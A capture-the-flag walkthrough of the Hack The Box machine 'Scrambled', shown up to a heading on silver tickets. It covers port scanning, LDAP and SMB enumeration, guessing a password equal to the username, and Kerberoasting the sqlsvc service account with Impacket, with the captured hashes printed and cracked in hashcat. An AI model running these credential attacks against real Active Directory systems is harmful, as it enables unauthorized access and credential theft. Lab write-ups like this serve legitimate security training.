---
title: HTB: Scrambled [From Linux]
url: https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html
date: 2022-10-01T13:45:00+00:00
tags: htb-scrambled, ctf, hackthebox, nmap, windows, domain-controller, kerberos, ldap, feroxbuster, ldapsearch, impacket, kerberoast, github, hashcat, mssql, silver-ticket, crackstation, python, ticketer, klist, mssqlclient, pssession, reverse-engineering, wireshark, dnspy, deserialization, ysoserial.net
---

## Recon

### nmap

`nmap` finds many TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.168
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-09 12:45 UTC
Nmap scan report for 10.10.11.168
Host is up (0.097s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49684/tcp open  unknown
49691/tcp open  unknown
60013/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,1433,4411,5985,9389 -sCV 10.10.11.168
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-09 12:46 UTC
Nmap scan report for 10.10.11.168
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-09 12:46:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-06-09T12:49:27+00:00; +1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-06-09T12:49:27+00:00; +1s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server  15.00.2000.00
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-06-09T12:38:55
|_Not valid after:  2052-06-09T12:38:55
|_ssl-date: 2022-06-09T12:49:27+00:00; +1s from scanner time.
4411/tcp open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=6/9%Time=62A1EB9F%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4411-TCP:V=7.80%I=7%D=6/9%Time=62A1EB9A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW
SF:N_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLSS
SF:essionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourOh
SF:FourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;
SF:\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk-
SF:RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-09T12:48:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.98 seconds

```

These look like the typical ports I would expect on a Windows DC, plus 80 (HTTP), 5985 (WinRM), 1433 (MSSQL), and something unknown on 4411. LDAP shows the full hostname as `DC1.scrm.local`. I’ll add both `DC1.scrm.local` and `scrm.local` to my `/etc/hosts` file.

Some quick checks show nothing that I can access without creds except for HTTP (80).

### Website - TCP 80

#### Site

The site is an internal site for Scramble Corp. It’s got some basic stats:

![image-20220609085132830](https://0xdfimages.gitlab.io/img/image-20220609085132830.png)

There are several links to different pages where I’ll collect bits of information.
- NTLM authentication is disabled:

  ![image-20220609085217106](https://0xdfimages.gitlab.io/img/image-20220609085217106.png)

</picture>
- A screenshot leaks a username, ksimpson:

  ![image-20220609085509745](https://0xdfimages.gitlab.io/img/image-20220609085509745.png)

</picture>
- There is a “New User Account” form, but it doesn’t seem to actually submit data, so seems not important.
- `/salesorders.html` has details on the “Sales Orders App”, which confirms the hostname / domain name from `nmap`, and also gives an indication of what TCP 4411 is used for:

  ![image-20220609085755427](https://0xdfimages.gitlab.io/img/image-20220609085755427.png)

</picture>
I’ll note there’s an option to “Enable debug logging”.
- `passwords.html` says:

  > **Password Resets**
  >
  > Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.

#### Tech Stack

All the pages load as `.html` files, which is a good indication this is a static site. The headers don’t show any additional indication of dynamic content:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 04 Nov 2021 18:13:14 GMT
Accept-Ranges: bytes
ETag: "3aed29a2a7d1d71:0"
Server: Microsoft-IIS/10.0
Date: Thu, 09 Jun 2022 12:48:14 GMT
Connection: close
Content-Length: 2313

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site (with a lowercase list as IIS is case-insensitive), but it doesn’t find anything interesting:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.168 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.168
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       84l      156w     2313c http://10.10.11.168/
301      GET        2l       10w      151c http://10.10.11.168/images => http://10.10.11.168/images/
301      GET        2l       10w      151c http://10.10.11.168/assets => http://10.10.11.168/assets/
301      GET        2l       10w      155c http://10.10.11.168/assets/css => http://10.10.11.168/assets/css/
301      GET        2l       10w      154c http://10.10.11.168/assets/js => http://10.10.11.168/assets/js/
301      GET        2l       10w      162c http://10.10.11.168/assets/css/images => http://10.10.11.168/assets/css/images/
[####################] - 1m    186088/186088  0s      found:6       errors:0      
[####################] - 1m     26584/26584   366/s   http://10.10.11.168 
[####################] - 1m     26584/26584   365/s   http://10.10.11.168/ 
[####################] - 1m     26584/26584   365/s   http://10.10.11.168/images 
[####################] - 1m     26584/26584   364/s   http://10.10.11.168/assets 
[####################] - 1m     26584/26584   368/s   http://10.10.11.168/assets/css 
[####################] - 1m     26584/26584   365/s   http://10.10.11.168/assets/js 
[####################] - 1m     26584/26584   368/s   http://10.10.11.168/assets/css/images 

```

### LDAP - TCP 389

I’ll see what I can get from LDAP without creds. First I need the naming context:

```

oxdf@hacky$ ldapsearch -h 10.10.11.168 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Can’t go any further without auth:

```

oxdf@hacky$ ldapsearch -h 10.10.11.168 -x -b "DC=scrm,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=scrm,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

## Shell as MiscSvc

### SMB - TCP 445 [Auth]

#### Tools

Because NTLM authentication is disabled, I won’t be able to use many of the standard tools here, and I won’t be able to access any service by IP address if it requires authentication.

`smbclient` won’t work, and I wasn’t able to get `crackmapexec` to work either.

The [Impactet](https://github.com/SecureAuthCorp/impacket) script, `smbclient.py` (sometimes installed as `impacket-smbclient`) will work, using the `-k` option for Kerberos auth.

#### Creds

Given the one username I’ve identified so far (ksimpson), and the note that sometimes passwords are reset to be the username, I’ll try that over SMB, and it works:

```

oxdf@hacky$ smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

Type help for list of commands
#

```

`help` gives the commands:

```

# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)

```

#### Enumeration

`shares` shows the shares:

```

# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL

```

Most ksimpson can’t access:

```

# use ADMIN$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use C$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use HR
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use IT
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use Sales
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

```

There’s a single document in `Public`:

```

# use public
# ls
drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 22:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 17:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf

```

#### Network Security Changes.pdf

The document is a letter from the IT staff to all employees:

[![](https://0xdfimages.gitlab.io/img/NetworkSecurityChanges.png-1-16547879035782.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/NetworkSecurityChanges.png-1-16547879035782.png)

This mentions again that NTLM is disabled because of an NTLM relay attack, and now everything is done via Kerberos. It also mentions that the SQL database has had access removed from the HR department.

### Kerberoast

#### Collect Challenge/Response

`GetUserSPNs.py` (another [Impactet](https://github.com/SecureAuthCorp/impacket) script) is typically how fetch a potentially crackable challenge/response from a Windows Server. However, when Scrambled was released, it breaks:

```

oxdf@hacky$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -debug
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/impacket/smbconnection.py", line 278, in login
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)
  File "/usr/local/lib/python3.8/dist-packages/impacket/smb3.py", line 923, in login
    if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
  File "/usr/local/lib/python3.8/dist-packages/impacket/smb3structs.py", line 458, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/bin/GetUserSPNs.py", line 113, in getMachineName
    s.login('', '')
  File "/usr/local/lib/python3.8/dist-packages/impacket/smbconnection.py", line 280, in login
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/bin/GetUserSPNs.py", line 510, in <module>
    executer.run()
  File "/usr/local/bin/GetUserSPNs.py", line 260, in run
    target = self.getMachineName()
  File "/usr/local/bin/GetUserSPNs.py", line 116, in getMachineName
    raise 'Error while anonymous logging into %s'
TypeError: exceptions must derive from BaseException
[-] exceptions must derive from BaseException

```

Some Googling shows that the author of this box has [raised an issue on the Impacket GitHub](https://github.com/SecureAuthCorp/impacket/issues/1206) for this very error with the title “GetUserSpns.py fails when using -k option and NTLM auth is disabled”. The suggested fix in that issue is to edit one line, which I’ll do on line 260:

```

        if self.__doKerberos:
            #target = self.getMachineName()
            target = self.__kdcHost

```

After making that change, it dumps a challenge/response (or “hash”, but not really a hash) for the MSSQLSvc user:

```

oxdf@hacky$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2022-06-09 12:38:53.607806             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2022-06-09 12:38:53.607806             

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e072073f4a55e5da82ffb47a79b1af27$435b563903b2fe93226ec9fa2ed61cf27100fb95cdad338fadde59bca765a353acbde62dd57069c0aaf233df91242c37941f2a77ab4181e79e706b663b319dd9cae533a998ea153863deecfc781fd164d1ddd8533646c2cf520788e8327b8e6f8d1cebc18aabff1d59175d1feceb46ef1c57f155b3fcba5bea23d756f332c34d87098bee05ff5f5c4efeae137d09b32ddf96f83aeb1697206c3bd387b18391a55e3e8696a8ce949f7263cd2ca894a43ccb1da0bf66918c0a62ba3e773b261aa2def3e9b8655c23f35ad920a70ed0fb74295cf88080e191f2389737ee8b06fd2e83aa073f24d9a6957625aba34b3930b888f82533dbee813b1db482cbe289cc665445227422d3771dee941e5889f3f8d92ee4bc2008a0abcfab9d3f16b5455131b55b9700ab1ddb44c639364fdfc32f566ce57c394866b1562a3430811bcae36f6dac2392aa6bb83db95e5ead924e870ff9c14cf5f6ce8f98e79cb7cd9fb23b3b36b92933ec7c5534df731bb851b931d974f86fdac987a2eea7f9d103c931b1d9625daa4b2d4a2164771ddb5aeaed601b46ef8588bd14e876d4b6bb8f1054777ec17b011ed48426a9af7e55fac84784ab00de9d27b63ed21481b782bc39775d263f875f2588eccdb7a8aadd81f5d9b0bbe0d429f251688de9b4e5dfe62f9ff04a1246bb4a46a7b2b5ff6aa41cf9dc544cb793253348e31f513df1fe0b92ef687fbcb6235cb284e648a1e6d24a896084266b53897255f0f0464af0527b34fc2411e4532dac626abc153913bfa830c638418999d8272740f6b2871ec8820104f4e45c4aad639c160bcdfac6e8b4ca0f0c4313d592e7a0f5448c0f8e8f1b45c7b3ad0105585a5fae2a369b89d790db71e03d1d27cebdbf0b60ebc291d12f38aa62a97c3ab7cbca9bf28104089850386cc7008b0f00bc92bb17bd7c43c210b935f4035e00342e7bb9690afb9b7a1f8e73ee5ec065a5096e1b786e92faa32ca85209e9595d0cc7f2da26e8d9ea64aa49938c16169fe6b094426bbeb9b362929c00d853dc89488b22af4c753d2d32ae448cff1e5b89aac5c608046d911ac245dfe0aa7dfe92973807c5f655eb7ac25496aa1a7e1618d87b45fe2546857fbfc6d4dfe45acb1dc95774a1e7599980715dc6cb213b15873064ed08c70334efd247866d75718c2012207604ed02c4937026eb080ffea605173722f9fba39318a215cdef702be8ca84c43d446837d04be4b16851b0890c42cb95ed43c9f3f99f00bd22c157258f34c242bd77d2006d56eac7b52612838c9554cf4bcd7933f337ef6eda88fa9b00610cf7598c5fb3f5b9aa1223a53423a257c30d00dd1c4f9dd51bef4df1760f4e9273c2e16021da0dfc38fd98c81ed0f1667b97ee4e0bab6790ccd8d675bf7fdeae8e97f25aa0558b4ae858bfc1e5553485afba9084d877a20816

```

The issue has been fixed, and if I use the up to date Impacket, I just need to use `-dc-host` instead of `-dc-ip`:

```

oxdf@hacky$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[*] Getting machine hostname
[-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option

oxdf@hacky$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2022-09-27 20:50:47.384025             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2022-09-27 20:50:47.384025             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$7d0427e0f264b8353b6d698a94ebbdd0$86afd2b41b0d6d97163c57a8d83e1a865d4deecb929ab11c245d7f1e6be9b4ec98497919d5c0f534da9dc41835c30d93bc49a80c69932cba1bb4c7191fc02a235d5ba87af6000d23ac85ab08ce57bec96da2b781f64bed0614a5ab289632ede3681612a7b6cc136191f7591842bed6064d29c8f53db4eb706948d0b33a7f36fdbd260c32f88f8be43074b2224fe85bb2db48c01db3a93e6f0896875efe82f8959303903ca7387a9035f6501ade7c473f8baa225beaf6a7e7d16c266611527a1c44a6368b4186c1e5787d2a53b362f7d67acf75737579651be6edb47d7f4c9be5321b7d2e06ee7193cde699b414db3b633e7982cb183a0fb83ea545af29d23710ecb2d565e0fe8f6b53ba2d714fe68071d32de0ee4f20e10a6c3ff8e5ee8c05e2709e81685dcf7f7bddda4e2c42d0ceef4e72c395b1db22bb5f7915b3135451ab8f0f1e748e6b281dc66dc44369131479f2d1f605243c0c080827e0d972a40b62b9052f288b9a506dbeb578f585bb0ce53514f567cadcdb39337d261c446bff419d693d0e51a04e4af3069b25565c514b845ad4af73d0a280f4408da2d4567a249013eec40359fc2e111db00e8bd7dcbd28d05ee429104f0e8a68882d319dfddf3b729825eb0fca0fba421bac9d8a23978161e4b04a79ec604f06079794b893e9b6afccf667f2f9223e353bdf60aac4a0e953ab05a88c3cec30aa55f87bc967d7bebfd5b0183b376ebc8529a0ae33890210ce34c6a72a9bc65064fb69241f7f59ec67afa7f02dd1d13c61578b928d889f2d85ffc06fd63b93e0426ecc25d979db5034e4b7ec8b33f310d5c35ad52d93214fa7cabe0e3d29e22101c64c71ecb067e709b5f9925a144be374b73cbf465dbf9ca789eaa22f29a4a8996799407ed00374ef5800cf3a82c2a65c4f96a63c56853238c47afa6b7ef88beb57e73b90d080b801c2be1c8da31bda26b086f65168b64b765e36fcc7c027a43a9b0fa5ce0e3f746e9fe6f129e9e14ca7ddc8d9367808d93c1e179220f9aa236fc309f76a9dfd125b6e2a8a9c4eac7a01e10c9de636f5fda0841d4cfe1f55e62b4f4f94145cf5e42cee78cb878d619d62c19ce691edc6e5c3074f263f311daa8b8eb128018397086fed0fa43976a6330b637aa7301f10ca1d2fa766f5a9380088e3489e7b653591ed097c1d47154ef8c5899d6663cc1a8464e98979910e4f6ae66c4de87dd9ffac3701946a147bf5eb40109ec736494298ce53fc102fd0ea1fefb1dc252acb07de1eef1b869d23582234abb8e55433224648f6ce6440ae46ddc9f5edd2dcae6ad16358456852fcd4530de86a457b07bf17eeee77887651f1723cf76b04f6aa357a5529ff0df3e5a25b56216354710efa81654ac922d2447e48194d0100a81152c1926ce3353ef557d3637c733c63915fab0fd8b20f3c9d840c8ae5

```

#### Crack It

I’ll save this to a file, and run it into `hashcat` with `rockyou.txt`:

```

$ hashcat mssqlsvc-hash /usr/share/wordlists/rockyou.txt
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e072073f4a55e5da82ffb47a79b1af27$435b563903b2fe93226ec9fa2ed61cf27100fb95cdad338fadde59bca765a353acbde62dd57069c0aaf233df91242c37941f2a77ab4181e79e706b663b319dd9cae533a998ea153863deecfc781fd164d1ddd8533646c2cf520788e8327b8e6f8d1cebc18aabff1d59175d1feceb46ef1c57f155b3fcba5bea23d756f332c34d87098bee05ff5f5c4efeae137d09b32ddf96f83aeb1697206c3bd387b18391a55e3e8696a8ce949f7263cd2ca894a43ccb1da0bf66918c0a62ba3e773b261aa2def3e9b8655c23f35ad920a70ed0fb74295cf88080e191f2389737ee8b06fd2e83aa073f24d9a6957625aba34b3930b888f82533dbee813b1db482cbe289cc665445227422d3771dee941e5889f3f8d92ee4bc2008a0abcfab9d3f16b5455131b55b9700ab1ddb44c639364fdfc32f566ce57c394866b1562a3430811bcae36f6dac2392aa6bb83db95e5ead924e870ff9c14cf5f6ce8f98e79cb7cd9fb23b3b36b92933ec7c5534df731bb851b931d974f86fdac987a2eea7f9d103c931b1d9625daa4b2d4a2164771ddb5aeaed601b46ef8588bd14e876d4b6bb8f1054777ec17b011ed48426a9af7e55fac84784ab00de9d27b63ed21481b782bc39775d263f875f2588eccdb7a8aadd81f5d9b0bbe0d429f251688de9b4e5dfe62f9ff04a1246bb4a46a7b2b5ff6aa41cf9dc544cb793253348e31f513df1fe0b92ef687fbcb6235cb284e648a1e6d24a896084266b53897255f0f0464af0527b34fc2411e4532dac626abc153913bfa830c638418999d8272740f6b2871ec8820104f4e45c4aad639c160bcdfac6e8b4ca0f0c4313d592e7a0f5448c0f8e8f1b45c7b3ad0105585a5fae2a369b89d790db71e03d1d27cebdbf0b60ebc291d12f38aa62a97c3ab7cbca9bf28104089850386cc7008b0f00bc92bb17bd7c43c210b935f4035e00342e7bb9690afb9b7a1f8e73ee5ec065a5096e1b786e92faa32ca85209e9595d0cc7f2da26e8d9ea64aa49938c16169fe6b094426bbeb9b362929c00d853dc89488b22af4c753d2d32ae448cff1e5b89aac5c608046d911ac245dfe0aa7dfe92973807c5f655eb7ac25496aa1a7e1618d87b45fe2546857fbfc6d4dfe45acb1dc95774a1e7599980715dc6cb213b15873064ed08c70334efd247866d75718c2012207604ed02c4937026eb080ffea605173722f9fba39318a215cdef702be8ca84c43d446837d04be4b16851b0890c42cb95ed43c9f3f99f00bd22c157258f34c242bd77d2006d56eac7b52612838c9554cf4bcd7933f337ef6eda88fa9b00610cf7598c5fb3f5b9aa1223a53423a257c30d00dd1c4f9dd51bef4df1760f4e9273c2e16021da0dfc38fd98c81ed0f1667b97ee4e0bab6790ccd8d675bf7fdeae8e97f25aa0558b4ae858bfc1e5553485afba9084d877a20816:Pegasus60
...[snip]...

```

In less than a minute on my system it breaks to “Pegasus60”.

### MSSQL Access

#### Silver Ticket Background

